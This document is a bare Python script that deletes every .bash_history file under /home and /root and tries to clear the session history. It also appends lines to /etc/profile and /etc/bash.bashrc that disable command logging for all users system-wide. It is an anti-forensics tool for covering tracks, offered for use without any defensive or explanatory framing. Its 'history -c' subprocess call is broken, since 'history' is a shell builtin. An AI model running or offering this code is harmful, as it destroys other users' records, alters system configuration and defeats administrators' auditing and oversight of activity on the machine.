import os
import subprocess

def remove_bash_history_files(start_directory):
    for dirpath, dirnames, filenames in os.walk(start_directory):
        for filename in filenames:
            if filename == '.bash_history':
                file_path = os.path.join(dirpath, filename)
                try:
                    os.remove(file_path)
                    print(f'Removed: {file_path}')
                except Exception as e:
                    print(f'Error removing {file_path}: {e}')

def clear_command_history():
    try:
        subprocess.run(['history', '-c'], check=True)
        print('Cleared current session command history.')
    except Exception as e:
        print(f'Error clearing command history: {e}')

def modify_environment():
    os.environ['HISTFILE'] = ''
    os.environ['HISTSIZE'] = '0'
    try:
        with open('/etc/profile', 'a') as profile_file:
            profile_file.write('\nunset HISTFILE; export HISTSIZE=0\n')
        with open('/etc/bash.bashrc', 'a') as bashrc_file:
            bashrc_file.write('\nunset HISTFILE; export HISTSIZE=0\n')
        print('Modified environment to disable future logging.')
    except Exception as e:
        print(f'Error modifying environment files: {e}')

if __name__ == '__main__':
    # Specify the directories to search
    directories_to_search = ['/home', '/root']
    for directory in directories_to_search:
        remove_bash_history_files(directory)
    clear_command_history()
    modify_environment()
